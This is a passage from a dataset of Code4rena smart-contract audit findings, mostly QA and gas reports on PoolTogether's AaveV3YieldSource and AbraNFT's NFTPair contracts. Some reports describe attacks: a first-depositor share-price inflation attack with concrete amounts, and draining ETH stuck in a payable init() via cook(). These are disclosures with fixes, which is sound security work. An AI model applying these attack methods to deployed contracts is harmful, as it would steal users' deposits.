_depositAmount, address(this), REFERRAL_CODE);\n \n     _mint(_to, _shares);\n \n@@ -256,7 +256,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     _burn(msg.sender, _shares);\n \n     uint256 _beforeBalance = _assetToken.balanceOf(address(this));\n-    _pool().withdraw(_underlyingAssetAddress, _redeemAmount, address(this));\n+    _pool_Jo$().withdraw(_underlyingAssetAddress, _redeemAmount, address(this));\n     uint256 _afterBalance = _assetToken.balanceOf(address(this));\n \n     uint256 _balanceDiff = _afterBalance.sub(_beforeBalance);\n@@ -385,7 +385,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    * @notice Retrieves Aave PoolAddressesProvider address.\n    * @return A reference to PoolAddressesProvider interface.\n    */\n-  function _poolProvider() internal view returns (IPoolAddressesProvider) {\n+  function _poolProvider_uaF() internal view returns (IPoolAddressesProvider) {\n     return\n       IPoolAddressesProvider(\n         poolAddressesProviderRegistry.getAddressesProvidersList()[ADDRESSES_PROVIDER_ID]\n@@ -396,7 +396,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    * @notice Retrieves Aave Pool address.\n    * @return A reference to Pool interface.\n    */\n-  function _pool() internal view returns (IPool) {\n-    return IPool(_poolProvider().getPool());\n+  function _pool_Jo$() internal view returns (IPool) {\n+    return IPool(_poolProvider_uaF().getPool());\n   }\n }\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..72bf242 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2505748  ·    2505760  ·    2505758  ·        8.4 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/84"
    }
  },
  {
    "title": "QA Report",
    "body": "* The contract is compiled with the version that has safe math enabled by default, yet it still explicitly uses the library:\n```solidity\n  pragma solidity 0.8.10;\n  using SafeMath for uint256;   \n  uint256 _balanceDiff = _afterBalance.sub(_beforeBalance);\n  return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));\n  return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);\n```\n\n* Would be better to re-use _requireNotAToken() function here:\n```solidity\n    function transferERC20(\n      ...\n      require(address(_token) != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n```\n\n* Not sure if the error message is correct here:\n```solidity\n    require(_token != address(aToken), \"AaveV3YS/forbid-aToken-allowance\");\n```\n\nIt is a bit misleading to name the parameter 'from' here:\n```solidity\n    event DecreasedERC20Allowance(\n        address indexed from,\n    event IncreasedERC20Allowance(\n        address indexed from\n```\nbecause the actual allowance is increased/decreased from the contract itself. A more intuitive name would be a 'sender' or 'caller', or something like that.\n\n* decimals() is not used in any meaningful way. A comment says:\n\"This value should be equal to the decimals of the token used to deposit into the pool.\"\nso I think you can at least query aToken.UNDERLYING_ASSET_ADDRESS().decimals() in the constructor to ensure that the decimals match.\n\n* This might not be compatible with IYieldSource, but I think it would be helpful to have an extra function redeemShares, so that users can specify their balance of shares directly when redeeming.\n\n* function redeemToken could validate that _redeemAmount > 0 to prevent spam of useless invocations.\n\n* safeApprove is deprecated: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L45\n```solidity\n  // Approve once for max amount\n  IERC20(_tokenAddress()).safeApprove(address(_pool()), type(uint256).max);\n```\nI think you can just use a regular 'approve' in the constructor to set the initial approval.",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/79"
    }
  },
  {
    "title": "QA Report",
    "body": "# 1. Obsolete usage of SafeMath\n## Risk\nLow\n\n## Impact\nContract `AaveV3YieldSource` is using `SafeMath` library for `uint256`. The contract is prepared for solidity `0.8.10` and using SafeMath is obsolete since the overflow/underflow security checks are built-in and done automatically for solidity versions `>= 0.8.0` for all calculations unless marked with `unchecked {}`.\n\n## Proof of Concept\n* https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L27\n\n## Used Tools\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to remove `SafeMath` from the contract.\n\n# 2. Invalid setting decimals\n## Risk\nLow\n\n## Impact\nConstructor `AaveV3YieldSource.constructor` allows setting `decimals` value in constructor. Based on the comments in the code the value of decimals should be equal to the decimals of the token used to deposit into the pool. Setting it by the user who is deploying the contract makes the process prone to errors.\n\nComment in `AaveV3YieldSource` contract:\n```\n   * @dev This value should be equal to the decimals of the token used to deposit into the pool.\n```\n\n## Proof of Concept\n* https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L179-L180\n* https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L216-L222\n\n## Used Tools\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to set `_decimals` by making external call to `aToken.decimals()`.\n\n# 3. Use immutable storage variables\n## Risk\nNon-Critical\n\n## Impact\nContract `AaveV3YieldSource` has multiple storage addresses that are only set in constructor but are not marked as immutable. \n\n## Proof of Concept\n* `IAToken public aToken` - https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L127\n* `IRewardsController public rewardsController` - https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L130\n* `IPoolAddressesProviderRegistry public poolAddressesProviderRegistry` - https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L133\n\n## Used Tools\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to mark listed storage variables as immutable.\n\n# 4. Redundant code for checking aToken address\n## Risk\nNon-Critical\n\n## Impact\nFunction `AaveV3YieldSource.transferERC20` is checking if the passed `_token` address argument is not a `aToken` address. Since there is already defined function `_requireNotAToken` that performs such a check it is better to reuse existing implementation.\n\n## Proof of Concept\n* https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L337\n\n## Used Tools\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to use `_requireNotAToken` in `AaveV3YieldSource.transferERC20` function.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/75"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### **Unnecessary usage of SafeMath**\n\n**Details**: \n\nThe functions from `SafeMath` used in AaveV3YieldSource.sol is not needed since the compiler has built in overflow checking for Solidity versions above 0.8. Consider removing `SafeMath` and replacing its operations for the corresponding native operations.\n\nIn particular the following changes must be applied:\n\n- Remove L14 and L26\n- Change L262 to\n    \n    ```solidity\n    uint256 _balanceDiff = _afterBalance - _beforeBalance;\n    ```\n    \n- Change L361 to\n    \n    ```solidity\n    return _supply == 0 ? _tokens : (_tokens*_supply)/(aToken.balanceOf(address(this)));\n    ```\n    \n- Change L373 to\n    \n    ```solidity\n    return _supply == 0 ? _shares : _shares*aToken.balanceOf(address(this))/_supply;\n    ```\n    \n\n**Gas saved**:\n\n- Before change:\n    \n    ```\n    ·-------------------------------------------------------|---------------------------|-------------|-----------------------------·\n    |                 Solc version: 0.8.10                  ·  Optimizer enabled: true  ·  Runs: 200  ·  Block limit: 30000000 gas  │\n    ························································|···························|·············|······························\n    |  Methods                                              ·              100 gwei/gas               ·       2794.03 usd/eth       │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  Contract                  ·  Method                  ·  Min        ·  Max        ·  Avg        ·  # calls      ·  usd (avg)  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  claimRewards            ·      54735  ·      56896  ·      55816  ·            4  ·      15.60  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  decreaseERC20Allowance  ·      37465  ·      39638  ·      38910  ·            3  ·      10.87  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  increaseERC20Allowance  ·      59133  ·      61618  ·      61212  ·            7  ·      17.10  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  mint                    ·      51381  ·      68493  ·      61904  ·           13  ·      17.30  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     110713  ·            1  ·      30.93  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  setManager              ·          -  ·          -  ·      47982  ·            4  ·      13.41  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110668  ·     153720  ·     142217  ·            6  ·      39.74  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·      16.59  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  ERC20Mintable             ·  approve                 ·      26692  ·      46592  ·      43275  ·            6  ·      12.09  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  ERC20Mintable             ·  mint                    ·      51408  ·      68820  ·      65715  ·           12  ·      18.36  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  ERC20Mintable             ·  transferFrom            ·          -  ·          -  ·      49823  ·            1  ·      13.92  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  Deployments                                          ·                                         ·  % of limit   ·             │\n    ························································|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·     700.12  │\n    ························································|·············|·············|·············|···············|··············\n    |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·     322.46  │\n    ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n    ```\n    \n- After change:\n    \n    ```\n    ·-------------------------------------------------------|---------------------------|-------------|-----------------------------·\n    |                 Solc version: 0.8.10                  ·  Optimizer enabled: true  ·  Runs: 200  ·  Block limit: 30000000 gas  │\n    ························································|···························|·············|······························\n    |  Methods                                              ·              100 gwei/gas               ·       2791.55 usd/eth       │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  Contract                  ·  Method                  ·  Min        ·  Max        ·  Avg        ·  # calls      ·  usd (avg)  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  claimRewards            ·      54735  ·      56896  ·      55816  ·            4  ·      15.58  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  decreaseERC20Allowance  ·      37465  ·      39638  ·      38910  ·            3  ·      10.86  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  increaseERC20Allowance  ·      59133  ·      61618  ·      61212  ·            7  ·      17.09  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  mint                    ·      51381  ·      68493  ·      61904  ·           13  ·      17.28  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     110584  ·            1  ·      30.87  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  setManager              ·          -  ·          -  ·      47982  ·            4  ·      13.39  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110584  ·     153720  ·     142189  ·            6  ·      39.69  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·      16.58  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  ERC20Mintable             ·  approve                 ·      26692  ·      46592  ·      43275  ·            6  ·      12.08  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  ERC20Mintable             ·  mint                    ·      51408  ·      68820  ·      65715  ·           12  ·      18.34  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  ERC20Mintable             ·  transferFrom            ·          -  ·          -  ·      49823  ·            1  ·      13.91  │\n    ·····························|··························|·············|·············|·············|···············|··············\n    |  Deployments                                          ·                                         ·  % of limit   ·             │\n    ························································|·············|·············|·············|···············|··············\n    |  AaveV3YieldSourceHarness                             ·    2497329  ·    2497341  ·    2497339  ·        8.3 %  ·     697.14  │\n    ························································|·············|·············|·············|···············|··············\n    |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·     322.17  │\n    ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n    ```",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/66"
    }
  },
  {
    "title": "QA Report",
    "body": "QA Report - non-critical\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\nTypos\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\nThe same typos (`inhereted` and `sane`) occur in both lines below:\t\t\t\t\t\t\t\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L38\t\t\t\t\t\t\t\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L156\t\t\t\t\t\t\t\n```solidity\t\t\t\t\t\t\t\n   * @param decimals Number of decimals the shares (inhereted ERC20) will have. Same as underlying asset to ensure sane exchange rates for shares.  \t\t\t\t\t\t\t\n```\t\t\t\t\t\t\t\nChange `inhereted` to `inherited` and `sane` to `same`",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/62"
    }
  },
  {
    "title": "QA Report",
    "body": "[NC - 01] - Fetch decimal from underlying asset\n\nDecimals is defined as \"Number of decimals the shares (inhereted ERC20) will have. Same as underlying asset to ensure sane exchange rates for shares\", and is passed as an argument in the constructor. It could easily be fetched directly from the underlying asset, avoiding a potential mistake during deployment.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/61"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### Rounding-error can be redeemed for free\nIf the `_redeemAmount` is > 0 but less than the value of 1 share, 0 share will be burned while the user can withdraw non-zero amount.\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L255\n```\n    uint256 _shares = _tokenToShares(_redeemAmount);\n```\n\n### IERC20 is re-used\n```\n        - IERC20 (node_modules/@aave/core-v3/contracts/dependencies/openzeppelin/contracts/IERC20.sol#7-80)\n        - IERC20 (node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol#9-82)\n```\nReference: https://github.com/crytic/slither/wiki/Detector-Documentation#name-reused\n\n## Non-Critical\n\n### Upgrade Solidity Version\nConsider to pin Solidity version to latest 0.8.12\n\n### Use custom errors\nSolidity ^0.8.4 allow the use of custom errors to optimize gas usage.\nhttps://blog.soliditylang.org/2021/04/21/custom-errors/\n\n### Duplicated code\nL337 can reuse `_requireNotAToken` in L348\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L337\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L348\n\n## Remove safeMath library\nSolidity > 0.8.0 have safe math by default\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L26\n```\n  using SafeMath for uint256;\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/59"
    }
  },
  {
    "title": "QA Report",
    "body": "# Summary\n\nWe list 1 low-critical finding and 1 non-critical finding:\n* (Low) `_requireNotAToken` should check the token address != address(0)\n* (Non) Duplicate code of address check\n\n# (Low) `_requireNotAToken` should check the token address != address(0)\n\n## Impact\n\nThe `decreaseERC20Allowance`, `increaseERC20Allowance` and `transferERC20` functions should check the token address != address(0).\n\n## Proof of Concept\n\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L296\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L315\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L332\n\n## Tools Used\n\nvim\n\n## Recommended Mitigation Steps\n\nCheck `address(_token) != address(0)`.\n\n# (Non) Duplicate code of address check\n\n## Impact\n\nIn `transferERC20`, it checks that the `_token` address should not be aToken, which is implemented in `_requireNotAToken`.\n\n## Proof of Concept\n\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L337\n\n## Tools Used\n\nvim\n\n## Recommended Mitigation Steps\n\nUse `_requireNotAToken` in the `transferERC20` function.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/56"
    }
  },
  {
    "title": "QA Report",
    "body": "**Table of Contents:**\n\n- [[L-01] Add a timelock to `transferERC20`](#l-01-add-a-timelock-to-transfererc20)\n- [[L-02] Prevent accidentally burning tokens](#l-02-prevent-accidentally-burning-tokens)\n- [[L-03] Deprecated safeApprove() function](#l-03-deprecated-safeapprove-function)\n- [[N-01] Missing comment section saying \"public\" instead of \"external\"](#n-01-missing-comment-section-saying-public-instead-of-external)\n\n## [L-01] Add a timelock to `transferERC20`\n\nA Malicious manager or owner could transfer any amount of token to any address.\n\n```solidity\nFile: AaveV3YieldSource.sol\n332:   function transferERC20(\n333:     IERC20 _token,\n334:     address _to,\n335:     uint256 _amount\n336:   ) external onlyManagerOrOwner { //@audit: timelock needed here\n337:     require(address(_token) != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n338:     _token.safeTransfer(_to, _amount);\n339:     emit TransferredERC20(msg.sender, _to, _amount, _token);\n340:   }\n```\n\nTo give more trust to users: this function should be put behind a timelock.\n\n## [L-02] Prevent accidentally burning tokens\n\nTransferring tokens to the zero address is usually prohibited to accidentally avoid \"burning\" tokens by sending them to an unrecoverable zero address.\n\nConsider adding a check to prevent accidentally burning tokens here:\n\n```solidity\nFile: AaveV3YieldSource.sol\n332:   function transferERC20(\n333:     IERC20 _token,\n334:     address _to,\n335:     uint256 _amount\n336:   ) external onlyManagerOrOwner {\n337:     require(address(_token) != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n338:     _token.safeTransfer(_to, _amount); //@audit to should be address(0) checked\n339:     emit TransferredERC20(msg.sender, _to, _amount, _token);\n340:   }\n```\n\n## [L-03] Deprecated safeApprove() function\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\nAs recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:\n\n```solidity\nFile: AaveV3YieldSource.sol\n182:     // Approve once for max amount\n183:     IERC20(_tokenAddress()).safeApprove(address(_pool()), type(uint256).max);\n```\n\n## [N-01] Missing comment section saying \"public\" instead of \"external\"\n\nThe following functions are under the `external` section:\n\n```solidity\nFile: AaveV3YieldSource.sol\n196:   /* ============ External Functions ============ */\n...\n207:   /**\n208:    * @notice Returns the ERC20 asset token used for deposits.\n209:    * @return The ERC20 asset token address.\n210:    */\n211:   function depositToken() public view override returns (address) { //@audit should be under /* ============ Public Functions ============ */\n212:     return _tokenAddress();\n213:   }\n214: \n215:   /**\n216:    * @notice Returns the Yield Source ERC20 token decimals.\n217:    * @dev This value should be equal to the decimals of the token used to deposit into the pool.\n218:    * @return The number of decimals.\n219:    */\n220:   function decimals() public view virtual override returns (uint8) { //@audit should be under /* ============ Public Functions ============ */\n221:     return _decimals;\n222:   }\n```\n\nConsider adding a comment mentioning the `public` section: `/* ============ Public Functions ============ */`.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/53"
    }
  },
  {
    "title": "[WP-H1] A malicious early user/attacker can manipulate the vault's pricePerShare to take an unfair share of future users' deposits",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L352-L374\n\n\n# Vulnerability details\n\nThis is a well-known attack vector for new contracts that utilize pricePerShare for accounting.\n\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L352-L374\n\n```solidity\n  /**\n   * @notice Calculates the number of shares that should be minted or burnt when a user deposit or withdraw.\n   * @param _tokens Amount of asset tokens\n   * @return Number of shares.\n   */\n  function _tokenToShares(uint256 _tokens) internal view returns (uint256) {\n    uint256 _supply = totalSupply();\n\n    // shares = (tokens * totalShares) / yieldSourceATokenTotalSupply\n    return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));\n  }\n\n  /**\n   * @notice Calculates the number of asset tokens a user has in the yield source.\n   * @param _shares Amount of shares\n   * @return Number of asset tokens.\n   */\n  function _sharesToToken(uint256 _shares) internal view returns (uint256) {\n    uint256 _supply = totalSupply();\n\n    // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares\n    return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);\n  }\n```\n\nA malicious early user can `supplyTokenTo()` with `1 wei` of `_underlyingAssetAddress` token as the first depositor of the `AaveV3YieldSource.sol`, and get `1 wei` of shares token.\n\nThen the attacker can send `10000e18 - 1` of `aToken` and inflate the price per share from 1.0000 to an extreme value of 1.0000e22 ( from `(1 + 10000e18 - 1) / 1`) .\n\nAs a result, the future user who deposits `19999e18` will only receive `1 wei` (from `19999e18 * 1 / 10000e18`) of shares token.\n\nThey will immediately lose `9999e18` or half of their deposits if they `redeemToken()` right after the `supplyTokenTo()`.\n\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L251-L256\n\n```solidity\n  function redeemToken(uint256 _redeemAmount) external override nonReentrant returns (uint256) {\n    address _underlyingAssetAddress = _tokenAddress();\n    IERC20 _assetToken = IERC20(_underlyingAssetAddress);\n\n    uint256 _shares = _tokenToShares(_redeemAmount);\n    _burn(msg.sender, _shares);\n    ...\n```\n\nFurthermore, after the PPS has been inflated to an extremely high value (`10000e18`), the attacker can also redeem tokens up to `9999e18` for free, (burn `0` shares) due to the precision loss.\n\n### Recommendation\n\nConsider requiring a minimal amount of share tokens to be minted for the first minter, and send a port of the initial mints as a reserve to the DAO address so that the pricePerShare can be more resistant to manipulation.\n\nAlso, consder adding `require(_shares > 0, \"AaveV3YS/shares-gt-zero\");` before `_burn(msg.sender, _shares);`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/44"
    }
  },
  {
    "title": "QA Report",
    "body": "### 1. Change function mutability of `balanceOfToken()` to `view`: \n- https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L203-L205 \n\n### 2. Add Reentrancy Guard (`nonReentrant`)to `transferERC20()` \n - Although the call is restricted to only owner or Manager, using reentrancy guard is a good practice ",
    "dataSource": {
      "name": "code-423n4/2022-04-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-04-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-04-pooltogether-findings/issues/42"
    }
  },
  {
    "title": "QA Report",
    "body": "# Gas optimizations:\n\n## 1. Unnecessary loan parameter comparison in `_lend` when used in through `requestAndBorrow` or `takeCollateralAndLend`\n* in internal function `_lend`, it takes an parameter called `accepted` and compare it with the state variable tokenLoanParams to make sure the borrower didn't front-run the tx. This is a good check, but in `requestAndBorrow` and `takeCollateralAndLend`, same parameters are passed in for `_requestLoan` and `_lend`, considering these are probably the most used function, it would be better to use a boolean call checkLoan to decide if we need this check or not. It will only be needed in `lend` function. (or just move the check into a different internal function and call it before `lend`)\n\n# QA Report: Recommandation (No bug found)\nI highly recommend the team to remove the ability to do arbitrary function calls on behalf of the NFTPair contract. Use of arbitrary contract call is a very dangerous pattern, it should be avoided unless there's a very strong motive to support it.\n\nThings that can go wrong with it:\n1. user's wallet can be drained if they accidentally approve the `NFTPair` contract to use their `asset`. (it should have been approving BentoBox) This can be achieved by calling asset.transferFrom(user, attacker).\n2. potential airdrops or any token will become public for anyone to withdraw.\n3. it's possible that the `collateral` suffer the same vulnerability as the tUSD bug and [could have lead to huge hack in Compound](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/). The exact bug caused by having 2 entry points to a single contract is unlikely to happen with well-known ERC20s again, but there might be more potential issue similar to this one, and the process of adding collateral will need to be better reviewed, potentially the team should not accept any upgradable contracts.\n4. Same thing happen to `BentoBoxV1` contract, if the  team decide to launch this code base on BentoBoxV1 it should be safe, but if the newer version is upgrdable then this mechanism cannot be trusted, because it's possible that user use different entry points to mess up BentoBox's accounting.\n\n### Solution:\nIf the team added this feature to support token farming or trapped tokens, it would make sense to add `onlyOwner` sweep function to do that; If it was mainly for interacting with other protocols, I suggest add a custom interface as a middle layer: So only allow the `NFTPair` contract to call `ICallee(callee).ourSpecialCall(data)`, and for each cool feature you want to support you add a new callee contract which works as a security proxy. \n\nIMO arbitrary calls lead to a huge space of potential vulnerabilities (some of them might still be unknown), so i would suggest to completely remove the possibility of volnerability by replacing it with one of the solution above.",
    "dataSource": {
      "name": "code-423n4/2022-04-abranft-findings",
      "repo": "https://github.com/code-423n4/2022-04-abranft-findings",
      "url": "https://github.com/code-423n4/2022-04-abranft-findings/issues/195"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L192-L196\nhttps://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L175-L179\n\n\n# Vulnerability details\n\n## Impact\n\nThe function `init()` in both `NFTPair` and `NFTPairWithOracle` are `payable` but do not use `msg.value`.\n\nThe impact is that any native currency sent in the `init()` function will sit in the contract. These tokens may be claimed by the first user to call `cook()` with `ACTION_CALL` to transfer the value to an attacker controlled address.\n\n## Proof of Concept\n\n```solidity\n    function init(bytes calldata data) public payable override {\n        require(address(collateral) == address(0), \"NFTPair: already initialized\");\n        (collateral, asset) = abi.decode(data, (IERC721, IERC20));\n        require(address(collateral) != address(0), \"NFTPair: bad pair\");\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider enforcing `msg.value == 0` in the `init()` function.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-abranft-findings",
      "repo": "https://github.com/code-423n4/2022-04-abranft-findings",
      "url": "https://github.com/code-423n4/2022-04-abranft-findings/issues/192"
    }
  },
  {
    "title": "Gas Optimizations",
